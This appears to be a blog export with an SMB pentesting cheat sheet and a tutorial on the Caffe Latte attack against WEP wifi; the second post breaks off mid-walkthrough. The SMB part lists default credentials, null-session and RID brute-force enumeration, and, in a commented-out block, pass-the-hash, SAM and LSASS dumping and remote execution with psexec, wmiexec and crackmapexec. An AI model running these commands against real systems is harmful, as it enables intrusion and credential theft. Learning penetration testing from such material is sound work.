network resources such as:</p>\n<ul>\n<li>Printers</li>\n<li>Routers</li>\n<li>Interfaces released to the network</li>\n</ul>\n<p>The application area is mainly active on <em>Windows</em> operating systems, these network services support SMB with older versions, this means that older windows operating systems are perfectly compatible with newer ones.<br>However, there is a solution that allows the use of SMB on <em><strong>Linux and Unix</strong></em> distributions via Samba.</p>\n<p>The SMB server can provide some parts (if it allows it) of your local files, such as shares.<br>Therefore the part visible to a client is on the one hand independent of the server structure.<br>Access rights are defined by access control lists <em><strong>(ACL)</strong></em>. They can be controlled by attributes such as: </p>\n<ul>\n<li>Execute</li>\n<li>Read</li>\n<li>Full access for individual users or groups of users</li>\n</ul>\n<p><em><strong>ACLs</strong></em> are defined on the basis of shared resources and therefore do not correspond to the rights assigned locally on the server.</p>\n<h1 id=\"First-steps-Enumeration\"><a href=\"#First-steps-Enumeration\" class=\"headerlink\" title=\"First steps: Enumeration\"></a>First steps: Enumeration</h1><p>Scan a network searching for hosts:</p>\n<figure class=\"highlight console\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\">$ </span><span class=\"language-bash\">nbtscan -r 192.168.0.1/24</span></span><br></pre></td></tr></table></figure>\n\n<h1 id=\"View-the-SMB-server-version\"><a href=\"#View-the-SMB-server-version\" class=\"headerlink\" title=\"View the SMB server version\"></a>View the SMB server version</h1><p>First, to look for possible exploits in SMB it is important to know which version is being used. To do this you can use the MSF auxiliary module: </p>\n<figure class=\"highlight console\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\">$ </span><span class=\"language-bash\">msfconsole</span></span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\">$ </span><span class=\"language-bash\">msf6&gt; use auxiliary/scanner/smb/smb_version</span></span><br></pre></td></tr></table></figure>\n\n<p>Or u can use <strong>this script</strong>:</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"> <span class=\"comment\">#!/bin/sh</span></span><br><span class=\"line\"> <span class=\"comment\">#Author: rewardone</span></span><br><span class=\"line\"> <span class=\"comment\">#Description:</span></span><br><span class=\"line\"> <span class=\"comment\">#Requires root or sufficient permissions to use tcpdump.</span></span><br><span class=\"line\"> <span class=\"comment\"># It will listen for the first 7 packets of a null login</span></span><br><span class=\"line\"> <span class=\"comment\"># and will take the SMB version</span></span><br><span class=\"line\"> <span class=\"comment\">#Notes:</span></span><br><span class=\"line\"> <span class=\"comment\"># Sometimes it will not capture or print multiple # lines.</span></span><br><span class=\"line\"> <span class=\"comment\"># lines. It may be necessary to run a second time to succeed.</span></span><br><span class=\"line\"><span class=\"keyword\">if</span> [ -z <span class=\"variable\">$1</span> ]; <span class=\"keyword\">then</span> <span class=\"built_in\">echo</span> <span class=\"string\">&quot;Usage: ./smbver.sh RHOST &#123;RPORT&#125;&quot;</span> &amp;&amp; <span class=\"built_in\">exit</span>; <span class=\"keyword\">else</span> rhost=<span class=\"variable\">$1</span>; <span class=\"keyword\">fi</span></span><br><span class=\"line\"><span class=\"keyword\">if</span> [ ! -z <span class=\"variable\">$2</span> ]; <span class=\"keyword\">then</span> rport=<span class=\"variable\">$2</span>; <span class=\"keyword\">else</span> rport=139; <span class=\"keyword\">fi</span></span><br><span class=\"line\">tcpdump -s0 -n -i tap0 src <span class=\"variable\">$rhost</span> and port <span class=\"variable\">$rport</span> -A -c 7 2&gt;/dev/null | grep -i <span class=\"string\">&quot;samba|s.a.m&quot;</span> | <span class=\"built_in\">tr</span> -d <span class=\"string\">&#x27;.&#x27;</span> | grep -oP <span class=\"string\">&#x27;UnixSamba.*[0-9a-z]&#x27;</span> | <span class=\"built_in\">tr</span> -d <span class=\"string\">&#x27;&#123;\\n&#x27;</span> &amp; <span class=\"built_in\">echo</span> -n <span class=\"string\">&quot;<span class=\"variable\">$rhost</span>: &quot;</span> &amp;</span><br><span class=\"line\"><span class=\"built_in\">echo</span> <span class=\"string\">&quot;exit&quot;</span> | smbclient -L <span class=\"variable\">$rhost</span> 1&gt;/dev/null 2&gt;/dev/null</span><br><span class=\"line\"><span class=\"built_in\">echo</span> <span class=\"string\">&quot;&quot;</span> &amp;&amp; <span class=\"built_in\">sleep</span> .1</span><br></pre></td></tr></table></figure>\n\n\n<h1 id=\"SearchSploit\"><a href=\"#SearchSploit\" class=\"headerlink\" title=\"SearchSploit\"></a>SearchSploit</h1><p>To search for possible exploits that are related to SMB protocol you can use this command in msfconsole:</p>\n<figure class=\"highlight console\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\">$ </span><span class=\"language-bash\">msfconsole</span></span><br><span class=\"line\"></span><br><span class=\"line\">    Trace program: running</span><br><span class=\"line\"></span><br><span class=\"line\">           wake up, Neo...</span><br><span class=\"line\">        the matrix has you</span><br><span class=\"line\">      follow the white rabbit.</span><br><span class=\"line\"></span><br><span class=\"line\">          knock, knock, Neo.</span><br><span class=\"line\"></span><br><span class=\"line\">                        (`.         ,-,</span><br><span class=\"line\">                        ` `.    ,;&#x27; /</span><br><span class=\"line\">                         `.  ,&#x27;/ .&#x27;</span><br><span class=\"line\">                          `. X /.&#x27;</span><br><span class=\"line\">                .-;--&#x27;&#x27;--.._` ` (</span><br><span class=\"line\">              .&#x27;            /   `</span><br><span class=\"line\">             ,           ` &#x27;   Q &#x27;</span><br><span class=\"line\">             ,         ,   `._    \\</span><br><span class=\"line\">          ,.|         &#x27;     `-.;_&#x27;</span><br><span class=\"line\">          :  . `  ;    `  ` --,.._;</span><br><span class=\"line\">           &#x27; `    ,   )   .&#x27;</span><br><span class=\"line\">              `._ ,  &#x27;   /_</span><br><span class=\"line\">                 ; ,&#x27;&#x27;-,;&#x27; ``-</span><br><span class=\"line\">                  ``-..__``--`</span><br><span class=\"line\"></span><br><span class=\"line\">                             https://metasploit.com</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\">$ </span><span class=\"language-bash\">msf6&gt; search <span class=\"built_in\">type</span>:exploit platform:windows target:2008 smb</span></span><br><span class=\"line\">searchsploit microsoft smb</span><br></pre></td></tr></table></figure>\n\n<p>Or you can use this command, note that you must have installed searchsploit</p>\n<figure class=\"highlight console\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\">$ </span><span class=\"language-bash\">searchsploit smb</span></span><br></pre></td></tr></table></figure>\n<p>More info: <a href=\"https://www.exploit-db.com/searchsploit\">searchsploit</a></p>\n<h1 id=\"Possible-Credentials\"><a href=\"#Possible-Credentials\" class=\"headerlink\" title=\"Possible Credentials\"></a>Possible Credentials</h1><p>Sometimes companies leave the smb protocol misconfigured, or don’t even configure it at all, and sometimes if they do, they leave very basic credentials, which you can try to use, such as: </p>\n<table>\n<thead>\n<tr>\n<th>Usernames</th>\n<th>Passwords</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>(blank)</td>\n<td>(blank)</td>\n</tr>\n<tr>\n<td>guest</td>\n<td>(blank)</td>\n</tr>\n<tr>\n<td>Administrator, admin</td>\n<td>(blank), password, administrator, admin</td>\n</tr>\n<tr>\n<td>arcserve</td>\n<td>arcserve, backup</td>\n</tr>\n<tr>\n<td>tivoli, tmersrvd</td>\n<td>tivoli, tmersrvd, admin</td>\n</tr>\n<tr>\n<td>backupexec, backup</td>\n<td>backupexec, backup, arcada</td>\n</tr>\n<tr>\n<td>test, lab, demo</td>\n<td>password, test, lab, demo</td>\n</tr>\n</tbody></table>\n<h1 id=\"Some-Commands-to-get-more-information\"><a href=\"#Some-Commands-to-get-more-information\" class=\"headerlink\" title=\"Some Commands to get more information\"></a>Some Commands to get more information</h1><figure class=\"highlight console\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"> #</span><span class=\"language-bash\">Dump interesting information</span></span><br><span class=\"line\"><span class=\"meta prompt_\">$ </span><span class=\"language-bash\">enum4linux -a [-u <span class=\"string\">&quot;&lt;username&gt;&quot;</span> -p <span class=\"string\">&quot;&lt;passwd&gt;&quot;</span>] &lt;IP&gt;</span></span><br><span class=\"line\"><span class=\"meta prompt_\">$ </span><span class=\"language-bash\">enum4linux-ng -A [-u <span class=\"string\">&quot;&lt;username&gt;&quot;</span> -p <span class=\"string\">&quot;&lt;passwd&gt;&quot;</span>] &lt;IP&gt;</span></span><br><span class=\"line\"><span class=\"meta prompt_\">$ </span><span class=\"language-bash\">nmap --script <span class=\"string\">&quot;safe or smb-enum-*&quot;</span> -p 445 &lt;IP&gt;</span></span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"> #</span><span class=\"language-bash\">Connect to the rpc</span></span><br><span class=\"line\"><span class=\"meta prompt_\">$ </span><span class=\"language-bash\">rpcclient -U <span class=\"string\">&quot;&quot;</span> -N &lt;IP&gt; <span class=\"comment\">#No creds</span></span></span><br><span class=\"line\"><span class=\"meta prompt_\">$ </span><span class=\"language-bash\">rpcclient //machine.htb -U domain.local/USERNAME%754d87d42adabcca32bdb34a876cbffb  --pw-nt-hash</span></span><br><span class=\"line\"><span class=\"meta prompt_\">$ </span><span class=\"language-bash\"><span class=\"comment\">#You can use querydispinfo and enumdomusers to query user information</span></span></span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"> #</span><span class=\"language-bash\">Dump user information</span></span><br><span class=\"line\"><span class=\"meta prompt_\">$ </span><span class=\"language-bash\">/usr/share/doc/python3-impacket/examples/samrdump.py -port 139 [[domain/]username[:password]@]&lt;targetName or address&gt;</span></span><br><span class=\"line\"><span class=\"meta prompt_\">$ </span><span class=\"language-bash\">/usr/share/doc/python3-impacket/examples/samrdump.py -port 445 [[domain/]username[:password]@]&lt;targetName or address&gt;</span></span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"> #</span><span class=\"language-bash\">Map possible RPC endpoints</span></span><br><span class=\"line\"><span class=\"meta prompt_\">$ </span><span class=\"language-bash\">/usr/share/doc/python3-impacket/examples/rpcdump.py -port 135 [[domain/]username[:password]@]&lt;targetName or address&gt;</span></span><br><span class=\"line\"><span class=\"meta prompt_\">$ </span><span class=\"language-bash\">/usr/share/doc/python3-impacket/examples/rpcdump.py -port 139 [[domain/]username[:password]@]&lt;targetName or address&gt;</span></span><br><span class=\"line\"><span class=\"meta prompt_\">$ </span><span class=\"language-bash\">/usr/share/doc/python3-impacket/examples/rpcdump.py -port 445 [[domain/]username[:password]@]&lt;targetName or address&gt;</span></span><br></pre></td></tr></table></figure>\n\n<h1 id=\"Enumerating-LSARPC-and-SAMR-rpcclient\"><a href=\"#Enumerating-LSARPC-and-SAMR-rpcclient\" class=\"headerlink\" title=\"Enumerating LSARPC and SAMR rpcclient\"></a>Enumerating LSARPC and SAMR rpcclient</h1><p>Pat of this section was extracted from book “Network Security Assesment 3rd Edition”<br>You can use the Samba rpcclient utility to interact with RPC endpoints via named pipes. The following lists commands that you can issue to SAMR, LSARPC, and LSARPC-DS interfaces upon establishing a SMB session (often requiring credentials).</p>\n<h3 id=\"Server-Info\"><a href=\"#Server-Info\" class=\"headerlink\" title=\"Server Info\"></a>Server Info</h3><ul>\n<li>Server Info: <strong>srvinfo</strong></li>\n</ul>\n<h3 id=\"Users-enumeration\"><a href=\"#Users-enumeration\" class=\"headerlink\" title=\"Users enumeration\"></a>Users enumeration</h3><ul>\n<li>List users: <strong>querydispinfo</strong> and <strong>enumdomusers</strong></li>\n<li>Get user details: <strong>queryuser &lt;0xrid&gt;</strong></li>\n<li>Get user groups: <strong>queryusergroups &lt;0xrid&gt;</strong></li>\n<li>GET SID of a user: <strong>lookupnames <username></strong></li>\n<li>Get users aliases: <strong>queryuseraliases [builtin|domain] <sid></strong></li>\n</ul>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"> <span class=\"comment\">#Brute-Force users RIDs</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> $(seq <span class=\"number\">500</span> <span class=\"number\">1100</span>); do</span><br><span class=\"line\">    rpcclient -N -U <span class=\"string\">&quot;&quot;</span> <span class=\"number\">10.129</span><span class=\"number\">.14</span><span class=\"number\">.128</span> -c <span class=\"string\">&quot;queryuser 0x$(printf &#x27;%x\\n&#x27; $i)&quot;</span> | grep <span class=\"string\">&quot;User Name\\|user_rid\\|group_rid&quot;</span> &amp;&amp; echo <span class=\"string\">&quot;&quot;</span>;</span><br><span class=\"line\">done</span><br></pre></td></tr></table></figure>\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n<!---\n# You can also use samrdump.py for this purpose\nGroups enumeration\nList groups: enumdomgroups\nGet group details: querygroup <0xrid>\nGet group members: querygroupmem <0xrid>\nAliasgroups enumeration\nList alias: enumalsgroups <builtin|domain>\nGet members: queryaliasmem builtin|domain <0xrid>\nDomains enumeration\nList domains: enumdomains\nGet SID: lsaquery\nDomain info: querydominfo\nShares enumeration\nEnumerate all available shares: netshareenumall\nInfo about a share: netsharegetinfo <share>\nMore SIDs\nFind SIDs by name: lookupnames <username>\nFind more SIDs: lsaenumsid\nRID cycling (check more SIDs): lookupsids <sid>\nExtra commands\n\nTo understand better how the tools samrdump and rpcdump works you should read Pentesting MSRPC.\nGUI connection from linux\nIn the terminal:\nxdg-open smb://cascade.htb/\nIn file browser window (nautilus, thunar, etc)\nsmb://friendzone.htb/general/\nList shared folders\nIt is always recommended to look if you can access to anything, if you don't have credentials try using null credentials/guest user.\nsmbclient --no-pass -L //<IP> # Null user\nsmbclient -U 'username[%passwd]' -L [--pw-nt-hash] //<IP> #If you omit the pwd, it will be prompted. With --pw-nt-hash, the pwd provided is the NT hash\nsmbmap -H <IP> [-P <PORT>] #Null user\nsmbmap -u \"username\" -p \"password\" -H <IP> [-P <PORT>] #Creds\nsmbmap -u \"username\" -p \"<NT>:<LM>\" -H <IP> [-P <PORT>] #Pass-the-Hash\ncrackmapexec smb <IP> -u '' -p '' --shares #Null user\ncrackmapexec smb <IP> -u 'username' -p 'password' --shares #Guest user\ncrackmapexec smb <IP> -u 'username' -H '<HASH>' --shares #Guest user\nConnect/List a shared folder\n#Connect using smbclient\nsmbclient --no-pass //<IP>/<Folder>\nsmbclient -U 'username[%passwd]' -L [--pw-nt-hash] //<IP> #If you omit the pwd, it will be prompted. With --pw-nt-hash, the pwd provided is the NT hash\n#Use --no-pass -c 'recurse;ls'  to list recursively with smbclient\n\n#List with smbmap, without folder it list everything\nsmbmap [-u \"username\" -p \"password\"] -R [Folder] -H <IP> [-P <PORT>] # Recursive list\nsmbmap [-u \"username\" -p \"password\"] -r [Folder] -H <IP> [-P <PORT>] # Non-Recursive list\nsmbmap -u \"username\" -p \"<NT>:<LM>\" [-r/-R] [Folder] -H <IP> [-P <PORT>] #Pass-the-Hash\nManually enumerate windows shares and connect to them\nIt may be possible that you are restricted to display any shares of the host machine and when you try to list them it appears as if there aren't any shares to connect to. Thus it might be worth a short to try to manually connect to a share. To enumerate the shares manually you might want to look for responses like NT_STATUS_ACCESS_DENIED and NT_STATUS_BAD_NETWORK_NAME, when using a valid session (e.g. null session or valid credentials). These may indicate whether the share exists and you do not have access to it or the share does not exist at all.\nCommon share names for windows targets are\nC$\nD$\nADMIN$\nIPC$\nPRINT$\nFAX$\nSYSVOL\nNETLOGON\n(Common share names from Network Security Assessment 3rd edition)\nYou can try to connect to them by using the following command\nsmbclient -U '%' -N \\\\\\\\<IP>\\\\<SHARE> # null session to connect to a windows share\nsmbclient -U '<USER>' \\\\\\\\<IP>\\\\<SHARE> # authenticated session to connect to a windows share (you will be prompted for a password)\nor this script (using a null session)\n#/bin/bash\n\nip='<TARGET-IP-HERE>'\nshares=('C$' 'D$' 'ADMIN$' 'IPC$' 'PRINT$' 'FAX$' 'SYSVOL' 'NETLOGON')\n\nfor share in ${shares[*]}; do\n    output=$(smbclient -U '%' -N \\\\\\\\$ip\\\\$share -c '') \n\n    if [[ -z $output ]]; then \n        echo \"[+] creating a null session is possible for $share\" # no output if command goes through, thus assuming that a session was created\n    else\n        echo $output # echo error message (e.g. NT_STATUS_ACCESS_DENIED or NT_STATUS_BAD_NETWORK_NAME)\n    fi\ndone\nexamples\nsmbclient -U '%' -N \\\\\\\\192.168.0.24\\\\im_clearly_not_here # returns NT_STATUS_BAD_NETWORK_NAME\nsmbclient -U '%' -N \\\\\\\\192.168.0.24\\\\ADMIN$ # returns NT_STATUS_ACCESS_DENIED or even gives you a session\nMount a shared folder\nmount -t cifs //x.x.x.x/share /mnt/share\nmount -t cifs -o \"username=user,password=password\" //x.x.x.x/share /mnt/share\nDownload files\nRead previous sections to learn how to connect with credentials/Pass-the-Hash.\n#Search a file and download\nsudo smbmap -R Folder -H <IP> -A <FileName> -q # Search the file in recursive mode and download it inside /usr/share/smbmap\n#Download all\nsmbclient //<IP>/<share>\n> mask \"\"\n> recurse\n> prompt\n> mget *\n#Download everything to current directory\nCommands:\nmask: specifies the mask which is used to filter the files within the directory (e.g. \"\" for all files)\nrecurse: toggles recursion on (default: off)\nprompt: toggles prompting for filenames off (default: on)\nmget: copies all files matching the mask from host to client machine\n(Information from the manpage of smbclient)\nRead Registry\nYou may be able to read the registry using some discovered credentials. Impacket reg.py allows you to try:\nsudo reg.py domain.local/USERNAME@MACHINE.htb -hashes 1a3487d42adaa12332bdb34a876cb7e6:1a3487d42adaa12332bdb34a876cb7e6 query -keyName HKU -s\nsudo reg.py domain.local/USERNAME@MACHINE.htb -hashes 1a3487d42adaa12332bdb34a876cb7e6:1a3487d42adaa12332bdb34a876cb7e6 query -keyName HKCU -s\nsudo reg.py domain.local/USERNAME@MACHINE.htb -hashes 1a3487d42adaa12332bdb34a876cb7e6:1a3487d42adaa12332bdb34a876cb7e6 query -keyName HKLM -s\nLocal users\nEnumerate local users with SID brute-forcing:\nWith Impacket:\nlookupsid.py -no-pass hostname.local\nWith Metasploit:\nuse auxiliary/scanner/smb/smb_lookupsid\nset rhosts hostname.local\nrun\nNote: rpcclient command lookupsids only translates a SID to a username but doesn't allow enumeration via brute-forcing.\nPost Exploitation\nThe default config of a Samba server is usually located in /etc/samba/smb.conf and might have some dangerous configs:\n\nThe command smbstatus gives information about the server and about who is connected.\nAuthenticate using Kerberos\nYou can authenticate to kerberos using the tools smbclient and rpcclient:\nsmbclient --kerberos //ws01win10.domain.com/C$\nrpcclient -k ws01win10.domain.com\nExecute\ncrackmapexec\ncrackmapexec can execute commands abusing any of mmcexec, smbexec, atexec, wmiexec being wmiexec the default method. You can indicate which option you prefer to use with the parameter --exec-method:\napt-get install crackmapexec\n\ncrackmapexec smb 192.168.10.11 -u Administrator -p 'P@ssw0rd' -X '$PSVersionTable' #Execute Powershell\ncrackmapexec smb 192.168.10.11 -u Administrator -p 'P@ssw0rd' -x whoami #Excute cmd\ncrackmapexec smb 192.168.10.11 -u Administrator -H <NTHASH> -x whoami #Pass-the-Hash\n# Using --exec-method {mmcexec,smbexec,atexec,wmiexec}\n\ncrackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --sam #Dump SAM\ncrackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --lsa #Dump LSASS in memmory hashes\ncrackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --sessions #Get sessions (\ncrackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --loggedon-users #Get logged-on users\ncrackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --disks #Enumerate the disks\ncrackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --users #Enumerate users\ncrackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --groups # Enumerate groups\ncrackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --local-groups # Enumerate local groups\ncrackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --pass-pol #Get password policy\ncrackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --rid-brute #RID brute\npsexec/smbexec\n\nBoth options will create a new service (using \\pipe\\svcctl via SMB) in the victim machine and use it to execute something (psexec will upload an executable file to ADMIN$ share and smbexec will point to cmd.exe/powershell.exe and put in the arguments the payload --file-less technique--).\nMore info about psexec and smbexec.\nIn kali it is located on /usr/share/doc/python3-impacket/examples/\n#If no password is provided, it will be prompted\n./psexec.py [[domain/]username[:password]@]<targetName or address>\n./psexec.py -hashes <LM:NT> administrator@10.10.10.103 #Pass-the-Hash\npsexec \\\\192.168.122.66 -u Administrator -p 123456Ww\npsexec \\\\192.168.122.66 -u Administrator -p q23q34t34twd3w34t34wtw34t # Use pass the hash\nUsing parameter-k you can authenticate against kerberos instead of NTLM\nwmiexec/dcomexec\nStealthily execute a command shell without touching the disk or running a new service using DCOM via port 135.\nIn kali it is located on /usr/share/doc/python3-impacket/examples/\n#If no password is provided, it will be prompted\n./wmiexec.py [[domain/]username[:password]@]<targetName or address> #Prompt for password\n./wmiexec.py -hashes LM:NT administrator@10.10.10.103 #Pass-the-Hash\n#You can append to the end of the command a CMD command to be executed, if you dont do that a semi-interactive shell will be prompted\nUsing parameter-k you can authenticate against kerberos instead of NTLM\n#If no password is provided, it will be prompted\n./dcomexec.py [[domain/]username[:password]@]<targetName or address>\n./dcomexec.py -hashes <LM:NT> administrator@10.10.10.103 #Pass-the-Hash\n#You can append to the end of the command a CMD command to be executed, if you dont do that a semi-interactive shell will be prompted\nAtExec\nExecute commands via the Task Scheduler (using \\pipe\\atsvc via SMB).\nIn kali it is located on /usr/share/doc/python3-impacket/examples/\n./atexec.py [[domain/]username[:password]@]<targetName or address> \"command\"\n./atexec.py -hashes <LM:NT> administrator@10.10.10.175 \"whoami\"\nImpacket reference\nhttps://www.hackingarticles.in/beginners-guide-to-impacket-tool-kit-part-1/\nBruteforce users credentials\nThis is not recommended, you could block an account if you exceed the maximum allowed tries\nnmap --script smb-brute -p 445 <IP>\nridenum.py <IP> 500 50000 /root/passwds.txt #Get usernames bruteforcing that rids and then try to bruteforce each user name\nSMB relay attack\nThis attack uses the Responder toolkit to capture SMB authentication sessions on an internal network, and relays them to a target machine. If the authentication session is successful, it will automatically drop you into a system shell.\nMore information about this attack here.\n-->\n\n\n<h1 id=\"Blog-incomplete-working-on-it\"><a href=\"#Blog-incomplete-working-on-it\" class=\"headerlink\" title=\"Blog incomplete, working on it :)\"></a>Blog incomplete, working on it :)</h1>"},{"title":"Hacking Wifi | Caffe Latte Attack","_content":"\nHave you ever wondered how to hack a wifi network? Well, I show you one of the many attacks that exist, this is something old, we talked about it appearing in 2007 and that it is no longer viable, but is interesting and nice to show, I talk about the caffe latte attack, is an attack to get the password of a wifi access point that contains the WEP protocol.\n\n![Alt text](/images/coffe.jpg?raw=true \"Coffe-Latte-Attack\")\n\n<!-- more -->\n\n# Introduction\n\nHow does it work?\nWell it is simple, it is that in the WEP encryption the user has to authenticate while the access point does not, the lack of these 2 authentications causes that an attack can impersonate an AP by copying ESSID (name) and BSSID (mac adress) to get to pair with the client, and well, you can get to do interesting things, this attack only works in this protocol, in other protocols such as WPA and WPA2 will not work because here if you need authentication by the 2 parts\n\n# Graphical Demonstration\n\nThe process is as follows:\n\n![Alt text](/images/attackcoffelatte.png?raw=true \"Coffe\")\n\n\n# Theoretical Process\n\n1.- The attacker creates a Wifi access point (AP) with an ESSID exactly the same as one that is stored in a victim computer, this network will have Wep security but with a different key to the client because we do not know it.\n\n![Alt text](/images/caffelate1screenshot.png?raw=true \"CoffeLate1screenshot\")\n\n2.- Although the attacker and the victim have different encryption keys, the wep encryption allows to reach the phase of association of the client to the access point.\n\n![Alt text](/images/caffelate2screenshot.png?raw=true \"CoffeLate1screenshot\")\n\n3.- The authentication process of the client is done through the proposal of a \"challenge\", this is done from attacker to client, the \"challenge\" is nothing more than a cipher text with the shared key, the client will answer the challenge and the fake access point will say that it is valid although it is not true, then it will send an \"Authentication Success\".\n\n\n4.- Once the authentication process is finished, the client is associated to the access point.\n\n\n5.-Once the association is established, the client will try to obtain an ip via DHCP but the fake access point will not have DHCP and after a timeout the client OS will automatically assign a static ip corresponding to the APIPA range (169.254.0.1 to 169.254.255.255.254 with mask 255.255.0.0).\n\n![Alt text](/images/caffelate3screenshot.png?raw=true \"CoffeLate1screenshot\")\n\n6.- The client will send free ARPS informing of the static ip that has been self-assigned to avoid problems in the network.\n\n# Obtaining the password :)))\n\n7.- Finally, from the free ARP the AP Fake will introduce in the network ARP requests from any ip with destination ip to the client ip, the client will respond to the ARP packets that are arriving and in a short time we will have enough traffic to crack the WEP password.\n\n![Alt text](/images/caffelate4screenshot.png?raw=true \"CoffeLate1screenshot\")\n\n# Small explanations\n\nSimple, right, well, I want to tell you a few things before going to practice, the first thing is to tell you that, although this method seems very easy to perform, currently it is no longer, this protocol has been discontinued causing this attack is no longer viable, even so you can make a test environment to test this, I assure you that it is quite fun to perform\n\nThe second thing is that, to perform all these wireless network attacks, you will need to have a network card that MUST have monitor mode, be sure to check if they have this mode before buying one, and preferably a good antenna to pick up signal, traffic. Something like this:\n\n![Alt text](/images/network-card.jpg?raw=true \"Network-Card\")\n\nI would recommend you to buy the one you like the most\n\nThis is the one I have and the one I recommend the most :) :\n\n ------------------------------------------------------------------------------\n|https://www.amazon.com/-/es/Adaptador-Link-Wireless-Negro-Blanco/dp/B002SZEOLG|\n ------------------------------------------------------------------------------\n\n# Practice\n\n## Network Interface\nFirst we will have to see our network interfaces, for it we write ifconfig in our console and several options will appear to us, we choose the one that has the option for monitor mode, in my case it appears as wlan1.\n\n\n``` console\n$ ifconfig\n\ndocker0: flags=4099<UP,BROADCAST,MULTICAST>  mtu 1500\n        inet 172.17.0.1  netmask 255.255.0.0  broadcast 172.17.255.255\n        ether 02:42:3c:5a:be:41  txqueuelen 0  (Ethernet)\n        RX packets 0  bytes 0 (0.0 B)\n        RX errors 0  dropped 0  overruns 0  frame 0\n        TX packets 0  bytes 0 (0.0 B)\n        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0\n\neth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500\n        inet 192.168.126.136  netmask 255.255.255.0  broadcast 192.168.126.255\n        inet6 fe80::ad27:5aab:c811:2dbd  prefixlen 64  scopeid 0x20<link>\n        ether 00:0c:29:b3:0d:18  txqueuelen 1000  (Ethernet)\n        RX packets 260062  bytes 288327227 (274.9 MiB)\n        RX errors 0  dropped 0  overruns 0  frame 0\n        TX packets 134684  bytes 24893626 (23.7 MiB)\n        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0\n\nlo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536\n        inet 127.0.0.1  netmask 255.0.0.0\n        inet6 ::1  prefixlen 128  scopeid 0x10<host>\n        loop  txqueuelen 1000  (Local Loopback)\n        RX packets 4679  bytes 23032556 (21.9 MiB)\n        RX errors 0  dropped 0  overruns 0  frame 0\n        TX packets 4679  bytes 23032556 (21.9 MiB)\n        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0\n\nwlan1: **************************** *********\n \n```\n\nOnce we start the card in monitor mode and we can see it in the network interface with ifconfig (seen in the previous step), we will type this command: \nairmon-ng start wlan1\n\n``` console\n$ airmon-ng start wlan1\nFound 3 processes that could cause t rouble.\nIf airodump-ng, aireplay-ng or airtun-ng stops working after\na short period of time, you may want to kill (some of) them!\n-e\nPID     Name\n2731    